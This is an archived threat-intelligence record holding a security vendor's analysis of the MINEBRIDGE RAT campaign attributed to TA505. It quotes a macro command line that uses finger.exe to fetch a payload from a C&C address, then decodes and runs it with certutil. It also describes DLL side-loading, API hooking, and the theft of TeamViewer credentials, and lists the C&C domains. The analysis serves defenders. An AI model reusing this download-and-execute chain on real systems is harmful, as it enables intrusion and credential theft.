{
    "id": "c51f17f7-8ac5-4fe7-abbc-8dd4b60d066b",
    "created_at": "2023-01-12T15:01:16.267151Z",
    "updated_at": "2025-03-27T02:15:37.999327Z",
    "deleted_at": null,
    "sha1_hash": "ca99f2ab6c0ce6dd0b964f06c9df9a6db1a16fde",
    "title": "2021-02-23 - Return of the MINEBRIDGE RAT With New TTPs and Social Engineering Lures",
    "authors": "",
    "file_creation_date": "2022-05-28T19:35:15Z",
    "file_modification_date": "2022-05-28T19:35:15Z",
    "file_size": 3016479,
    "plain_text": "# Return of the MINEBRIDGE RAT With New TTPs and Social Engineering Lures\n\n**[zscaler.com/blogs/security-research/return-minebridge-rat-new-ttps-and-social-engineering-lures](https://www.zscaler.com/blogs/security-research/return-minebridge-rat-new-ttps-and-social-engineering-lures)**\n\n### Introduction\n\nIn Jan 2021, Zscaler ThreatLabZ discovered new instances of the MINEBRIDGE remoteaccess Trojan (RAT) embedded in macro-based Word document files crafted to look like\nvalid job resumes (CVs). Such lures are often used as social engineering schemes by\nthreat actors.\n\nMINEBRIDGE buries itself into the vulnerable remote desktop software TeamViewer,\nenabling the threat actor to take a wide array of remote follow-on actions such as spying on\nusers or deploying additional malware.\n\n[We have recently observed other instances of threat actors targeting security researchers](https://blog.google/threat-analysis-group/new-campaign-targeting-security-researchers/)\nwith social engineering techniques. While the threat actor we discuss in this blog is not the\nsame, the use of social engineering tactics targeting security teams appears to be on an\nupward trend.\n\nWe also observed a few changes in the tactics, techniques, and procedures (TTPs) of the\nthreat actor since the last instance of MINEBRIDGE RAT was observed in March 2020. In\nthis blog, we provide insights into the changes in TTPs, threat attribution, command-andcontrol (C&C) infrastructure, and a technical analysis of the attack flow.\n\n### Threat attribution\n\n\n-----\n\n[This attack was likely carried out by TA505, a financially motivated threat group that has](https://labs.sentinelone.com/breaking-ta505s-crypter-with-an-smt-solver/)\nbeen active since at least 2014. TA505 has been previously linked to very similar attacks\nusing MINEBRIDGE RAT. The job resume theme and C&C infrastructure used in this new\ninstance is consistent and in line with these former attacks. Due to the low volume of\nsamples we identified for this new attack, we attribute it to the same threat actor with a\nmoderate confidence level.\n\n### Attack flow\n\nFigure 1 below details the attack flow.\n\n_Figure 1: Attack flow_\n\n### Macro technical analysis\n\nFor the purpose of technical analysis of the attack flow, we will look at the macro-based\nWord document with the MD5 hash: f95643710018c437754b8a11cc943348\n\nWhen the Word document is opened and the macros are enabled, it displays the message:\n“File successfully converted from PDF” for social engineering purposes.\n\nThis message is followed by displaying the decoy document as shown below. Figure 2\nshows the contents of the decoy document which resemble a job resume (CV) of a threat\nintelligence analyst.\n\n\n-----\n\n-----\n\n_Figure 2: Decoy files using the CV of security researcher for social engineering purposes_\n\nThe macro code uses basic string obfuscation as shown in Figure 3.\n\n\n-----\n\n_Figure 3: Contents of the obfuscated macro_\n\nIt constructs the following command line and then executes it using Windows Management\nInstrumentation (WMI).\n\n**Command line: cmd /C finger** [[email protected] > %appdata%\\vUCooUr >>](https://www.zscaler.com/cdn-cgi/l/email-protection)\n%appdata%\\vUCooUr1 && certutil -decode %appdata%\\vUCooUr1\n%appdata%\\vUCooUr.exe &&cmd /C del %appdata%\\vUCooUr1 &&\n%appdata%\\vUCooUr.exe\n\nThis command leverages the Windows utility finger.exe to download encoded content from\nthe IP address: 184.164.146.102 and drops it in the %appdata% directory. The encoded\ncontent is decoded using the legitimate Windows utility certutil.exe and executed.\n\nThe usage of finger.exe to download the encoded content from the C&C server is one of the\nmajor TTP changes by this threat actor.\n\nWe see an increase in usage of living-off-the-land binaries (LOLBins) by the threat actor to\ndownload, decode, and execute the content in this new instance.\n\n### Stage 1: SFX archive\n\nThe content decoded using certutil.exe is a self-extracting archive (SFX) which we describe\nin this section of the blog.\n\nMD5 hash of SFX archive: 73b7b416d3e5b1ed0aa49bda20f7729a\n\n\n-----\n\nContents of the SFX archive are shown in Figure 4. It spoofs a legitimate TeamViewer\napplication.\n\n_Figure 4: Contents of the SFX archive_\n\nUpon execution, this SFX archive drops the legitimate TeamViewer binaries, a few DLLs\nand some document files.\n\nExecution flow starts with the binary called defrender.exe, which is masked to appear as a\nWindows Defender binary.\n\n### Stage 2 – DLL Side Loading\n\nThe dropped binary defrender.exe is a legitimate TeamViewer application version\n11.2.2150.0 which is vulnerable to DLL side loading. Upon execution, it loads the msi.dll\nbinary present in the same directory. The msi.dll is the file that performs further malicious\nactivity in the system.\n\nNext, MSI.dll unpacks a shellcode and executes it. The part of code responsible for\nshellcode unpacking and execution is shown in Figure 5.\n\n\n-----\n\n_Figure 5: Shellcode unpacking and execution_\n\nThe shellcode further unpacks another DLL with MD5 hash:\n59876020bb9b99e9de93f1dd2b14c7e7 from a hardcoded offset, maps it into the memory,\nand finally transfers the code execution to its entry point. The unpacked DLL is a UPXpacked binary of MINEBRIDGE RAT.\n\n### Stage 3: MINEBRIDGE RAT DLL\n\nOn unpacking the UPX layer we get the main MINEBRIDGE RAT DLL with MD5 hash:\n23edc18075533a4bb79b7c4ef71ff314.\n\n### Execution checks\n\nAt the very beginning, MINEBRIDGE RAT confirms that the DLL is not executed either via\n_regsvr32.exe or rundll32.exe._\n\nThen it checks the command-line argument and perform the following operations:\n\n1. If the command-line argument is __RESTART__ then sleep for 5 seconds and\n\nperform the operations which are described further.\n2. If the command-line argument is __START__ then it starts a BITS job to download a\n\nzip file-based payload and perform the operations which are described further.\n\nFigure 6 shows the relevant command line checks performed by MINEBRIDGE RAT.\n\n\n-----\n\n_Figure 6: Module name and command-line argument check/_\n\n### BITS Job download\n\nThe BITS job downloads a zip file by selecting a random C&C domain from the hardcoded\nlist inside the DLL using path “/~4387gfoyusfh_gut/~3fog467wugrgfgd43r9.bin”. The\ndownloaded DLL is dropped to a hardcoded filename “~f834ygf8yrubgfy4sd23.bin” in the\n_%temp% directory. When the download is completed, the zip file is extracted to_\n_“%ProgramData%\\VolumeDrive\\”,_\n\nFigure 7 shows the relevant code section responsible for using bitsadmin to download the\npayload.\n\n_Figure 7: BITS job to download the payload file and extract it to_\n_%ProgramData%\\VolumeDrive\\_\n\n\n-----\n\nAfter performing the above-mentioned checks, it loads the legitimate MSI.dll from\n_%System32% directory to initialize its own Export Address Table. This is done to prevent_\napplication crashes when any of the export functions are called. It then generates the\nBOT_ID after doing some computations with VolumeSerialNumber.\n\n_Figure 8: Export address table initialization and BOT_ID generation_\n\n### API Hooking\n\nMINEBRIDGE RAT then uses the mHook module to hook the following APIs, intercepting\nfunction calls in order to avoid accidental exposure of malicious code execution to the user:\n\nMessageBoxA\nMessageBoxW\nSetWindowTextW\nIsWindowVisible\nDialogBoxParamW\nShowWindow\nRegisterClassExW\n**CreateWindowExW**\nCreateDialogParamW\nShell_NotifyIconW\n**ShellExecuteExW**\nGetAdaptersInfo\nRegCreateKeyExW\nSetCurrentDirectoryW\nCreateMutexW\nCreateMutexA\nCreateFileW\n**GetVolumeInformationW**\n\nSince the last observed instance of this attack in 2020, a few more APIs have been added\nto the hook list which are highlighted in bold above -- but interestingly, the project path\nleaked by the mHook module remains unchanged.\n\n[C:\\users\\maximys\\desktop\\[email protected]\\mhook_lib\\mhook_lib\\disasm-lib\\disasm.c](https://www.zscaler.com/cdn-cgi/l/email-protection)\n\n\n-----\n\nFinally, if all the APIs are hooked successfully, MINEBRIDGE RAT creates three threads in\na sequence that perform the following tasks:\n\n1. First thread is responsible for C&C communication and achieving persistence.\n\n2. Second thread gathers when the last input was retrieved to check system idle status.\n\n3. Third thread kills the ShowNotificationDialog process regularly to avoid any notification\npopups.\n\n_Figure 9: Hooks APIs and creates threads_\n\n### Persistence\n\nFor persistence, MINEBRIDGE RAT creates a LNK file with the name “Windows Logon.lnk”\nin the startup directory. The LNK file points to the currently executing binary with icon same\nas “wlrmdr.exe” and description as “Windows Logon”.\n\n\n-----\n\n_Figure 10: LNK file properties showing target path and Icon source_\n\n### C&C communication\n\nMINEBRIDGE RAT supports the following C&C commands:\n\n-  drun_command\n\n-  rundll_command\n\n-  update_command\n\n-  restart_command\n\n-  terminate_command\n\n-  kill_command\n\n\n-----\n\n-  poweroff_command\n\n-  reboot_command\n\n-  Setinterval_command\n\nAt the time of analysis, we didn’t receive any active response from the C2 server. However,\nbased on the code flow, the communication mechanism seems to be the same as\npreviously reported attack instances. Detailed analysis of C2 communication can be found\nin this report.\n\n### Alternate attack flow\n\nThe MINEBRIDGE RAT DLL also has the support to be executed via regsvr32.exe. The\nmalicious code is present inside the DllRegisterServer export. When executed via\n_regsvr32.exe or rundll32.exe, the DllMain routine won’t perform any actions but_\n_regsvr32.exe also calls DllRegisterServer export implicitly and, hence, the malicious code_\ninside DllRegisterServer export gets executed.\n\nInterestingly, the check at the very beginning of the code inside DllRegisterServer export\nverifies that the process name is regsvr32.exe and only then executes the code further.\n\nWe didn’t see this code path using regsvr32.exe trigger in the current attack instance but it\n[fits with what has been reported in earlier instances from FireEye and the advisory report](https://www.fireeye.com/blog/threat-research/2020/01/stomp-2-dis-brilliance-in-the-visual-basics.html)\nwith a few changes in filenames and payload directory.\n\n\n-----\n\n_Figure 11: Payload download from DllRegisterServer export_\n\n### Zscaler Cloud Sandbox report\n\nFigure 12 shows the sandbox detection for the macro-based document used in the attack.\n\n_Figure 12: Zscaler Cloud Sandbox detection_\n\n\n-----\n\nIn addition to sandbox detections, Zscaler s multilayered cloud security platform detects\nindicators at various levels.\n\n### MITRE ATT&CK TTP Mapping\n\n**ID** **Tactic** **Technique**\n\nT1566.001 Spearphishing Attachment Uses doc based attachments with VBA macro\n\n\nT1204.002 User Execution: Malicious\nFile\n\nT1547.001 Registry Run Keys /\nStartup Folder\n\nT1140 Deobfuscate/Decode Files\nor Information\n\nT1036.005 Masquerading: Match\nLegitimate Name or\nLocation\n\nT1027.002 Obfuscated Files or\nInformation: Software\nPacking\n\nT1574.002 Hijack Execution Flow:\nDLL Side-Loading\n\nT1218 Signed Binary Proxy\nExecution\n\nT1056.002 Input Capture: GUI Input\nCapture\n\n\nUser opens the document file and enables the\nVBA macro\n\nCreates LNK file in the startup folder for\npayload execution\n\nStrings and other data are obfuscated in the\npayloads\n\nFile name used similar to legit Windows\nDefender binary\n\nPayloads are packed in layers\n\nUses legit TeamViewer binary with dll-side\nloading vulnerability\n\nUses finger.exe for encoded payload\ndownload and certutil.exe to decode the\npayload\n\nCaptures TeamViewer generated UsedID and\nPassword by hooking GUI APIs\n\n\nT1057 Process Discovery Verifies the name of parent process\n\n\nT1082 System Information\nDiscovery\n\n\nGathers system OS version info\n\n\n-----\n\nT1033 System Owner/User\nDiscovery\n\nT1071.001 Application Layer Protocol:\nWeb Protocols\n\nT1041 Exfiltration Over\nC&C Channel\n\n## Indicators of compromise\n\n**Document hashes**\n\nf95643710018c437754b8a11cc943348\n\n41c8f361278188b77f96c868861c111e\n\n**Filenames**\n\nMarisaCV.doc\n\nRicardoITCV.doc\n\n**Binary hashes**\n\n\nGathers currently logged in Username\n\nUses https for C&C communication\n\nData is exfiltrated using existing C2 channel\n\n\n73b7b416d3e5b1ed0aa49bda20f7729a [SFX Archive]\n\nd12c80de0cf5459d96dfca4924f65144 [msi.dll]\n\n59876020bb9b99e9de93f1dd2b14c7e7 [UPX packed MineBridge RAT]\n\n23edc18075533a4bb79b7c4ef71ff314 [Unpacked MineBridge RAT]\n\n**C&C domains**\n\n**// Below is a comprehensive list of C&C domains related to this threat actor**\n\nbillionaireshore.top\n\nvikingsofnorth.top\n\nrealityarchitector.top\n\ngentlebouncer.top\n\nbrainassault.top\n\ngreatersky.top\n\nunicornhub.top\n\ncorporatelover.top\n\nbloggersglobbers.top\n\n**Network paths**\n\n\n-----\n\n**// The network paths below are accessed by MineBridge RAT either using HTTP GET**\n**or POST requests**\n\n/~4387gfoyusfh_gut/~3fog467wugrgfgd43r9.bin\n/~8f3g4yogufey8g7yfg/~dfb375y8ufg34gfyu.bin\n/~munhgy8fw6egydubh/9gh3yrubhdkgfby43.php\n\n**User-agent:**\n\n\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5\n(KHTML, like Gecko) Version/11.0 Mobile/15B150 Safari/604.1\"\n\n**Network data fetch using finger.exe**\n\n**// Format:** **[[email protected]_address](https://www.zscaler.com/cdn-cgi/l/email-protection)**\n\n[[email protected]](https://www.zscaler.com/cdn-cgi/l/email-protection)\n\n**Downloaded files**\n\n**// Payloads are dropped in following paths**\n\n%temp%/~f834ygf8yrubgfy4sd23.bin\n%temp%/~t62btc7rbg763vbywgr6734.bin\n\n%appdata%\\vUCooUr1\n%appdata%\\vUCooUr.exe\n%programdata%\\Local Tempary\\defrender.exe\n%programdata%\\Local Tempary\\msi.dll\n%programdata%\\Local Tempary\\TeamViewer_Desktop.exe\n%programdata%\\Local Tempary\\TeamViewer_Resource_en.dll\n%programdata%\\Local Tempary\\TeamViewer_StaticRes.dll\n{STARTUP}\\Windows Logon.lnk\n\n**Exfiltrated user and system info**\n\n// Format string\n\nuuid=%s&id=%s&pass=%s&username=%s&pcname=%s&osver=%s&timeout=%d\n\nThe table below summarises the meaning of individual fields.\n\n**Field name** **Purpose**\n\n\n-----\n\nuuid BOT-ID of the user\n\nid TeamViewer ID of the user\n\npass TeamViewer password\n\nusername Currently logged in user name\n\npcname Name of the computer\n\nosver Operating system version\n\ntimeout Timeout between requests\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-02-23 - Return of the MINEBRIDGE RAT With New TTPs and Social Engineering Lures.pdf"
    ],
    "report_names": [
        "2021-02-23 - Return of the MINEBRIDGE RAT With New TTPs and Social Engineering Lures.pdf"
    ],
    "threat_actors": [
        {
            "id": "99cb4e5b-8071-4f9e-aa1d-45bfbb6197e3",
            "created_at": "2023-01-06T13:46:38.860754Z",
            "updated_at": "2025-03-27T02:00:02.937438Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "SectorJ04 Group",
                "Dudear",
                "G0092",
                "ATK103",
                "Hive0065",
                "Spandex Tempest",
                "GRACEFUL SPIDER",
                "GOLD TAHOE",
                "CHIMBORAZO",
                "SectorJ04"
            ],
            "source_name": "MISPGALAXY:TA505",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5e6b31a6-80e3-4e7d-8b0a-d94897ce9b59",
            "created_at": "2024-06-19T02:03:08.128175Z",
            "updated_at": "2025-03-27T02:05:17.400394Z",
            "deleted_at": null,
            "main_name": "GOLD TAHOE",
            "aliases": [
                "SectorJ04 ",
                "Spandex Tempest ",
                "TA505 ",
                "FIN11 "
            ],
            "source_name": "Secureworks:GOLD TAHOE",
            "tools": [
                " Cobalt Strike",
                " FlawedAmmy",
                " Get2",
                " GraceWire",
                " Malichus",
                " SDBbot",
                " ServHelper",
                " TrueBot",
                "Clop"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "75d4d6a9-b5d1-4087-a7a0-e4a9587c45f4",
            "created_at": "2022-10-25T15:50:23.5188Z",
            "updated_at": "2025-03-27T02:00:55.489882Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "TA505",
                "Hive0065",
                "Spandex Tempest",
                "CHIMBORAZO"
            ],
            "source_name": "MITRE:TA505",
            "tools": [
                "AdFind",
                "Azorult",
                "FlawedAmmyy",
                "Mimikatz",
                "Dridex",
                "TrickBot",
                "Get2",
                "FlawedGrace",
                "Cobalt Strike",
                "ServHelper",
                "Amadey",
                "SDBbot",
                "PowerSploit"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e447d393-c259-46e2-9932-19be2ba67149",
            "created_at": "2022-10-25T16:07:24.28282Z",
            "updated_at": "2025-03-27T02:02:10.159466Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "ATK 103",
                "Chimborazo",
                "Gold Evergreen",
                "Gold Tahoe",
                "Graceful Spider",
                "Hive0065",
                "Operation Tovar",
                "Operation Trident Breach",
                "SectorJ04",
                "Spandex Tempest",
                "TA505",
                "TEMP.Warlock"
            ],
            "source_name": "ETDA:TA505",
            "tools": [
                "Amadey",
                "AmmyyRAT",
                "AndroMut",
                "Azer",
                "Bart",
                "Bugat v5",
                "CryptFile2",
                "CryptoLocker",
                "CryptoMix",
                "CryptoShield",
                "Dridex",
                "Dudear",
                "EmailStealer",
                "FRIENDSPEAK",
                "Fake Globe",
                "Fareit",
                "FlawedAmmyy",
                "FlawedGrace",
                "FlowerPippi",
                "GOZ",
                "GameOver Zeus",
                "GazGolder",
                "Gelup",
                "Get2",
                "GetandGo",
                "GlobeImposter",
                "Gorhax",
                "GraceWire",
                "Gussdoor",
                "Jaff",
                "Kasidet",
                "Kegotip",
                "Kneber",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Locky",
                "MINEBRIDGE",
                "MINEBRIDGE RAT",
                "MirrorBlast",
                "Neutrino Bot",
                "Neutrino Exploit Kit",
                "P2P Zeus",
                "Peer-to-Peer Zeus",
                "Philadelphia",
                "Philadephia Ransom",
                "Pony Loader",
                "Rakhni",
                "ReflectiveGnome",
                "Remote Manipulator System",
                "RockLoader",
                "RuRAT",
                "SDBbot",
                "ServHelper",
                "Shifu",
                "Siplog",
                "TeslaGun",
                "TiniMet",
                "TinyMet",
                "Trojan.Zbot",
                "Wsnpoem",
                "Zbot",
                "Zeta",
                "ZeuS",
                "Zeus"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535676,
    "ts_updated_at": 1743041737,
    "ts_creation_date": 1653766515,
    "ts_modification_date": 1653766515,
    "files": {
        "pdf": "https://archive.orkl.eu/ca99f2ab6c0ce6dd0b964f06c9df9a6db1a16fde.pdf",
        "text": "https://archive.orkl.eu/ca99f2ab6c0ce6dd0b964f06c9df9a6db1a16fde.txt",
        "img": "https://archive.orkl.eu/ca99f2ab6c0ce6dd0b964f06c9df9a6db1a16fde.jpg"
    }
}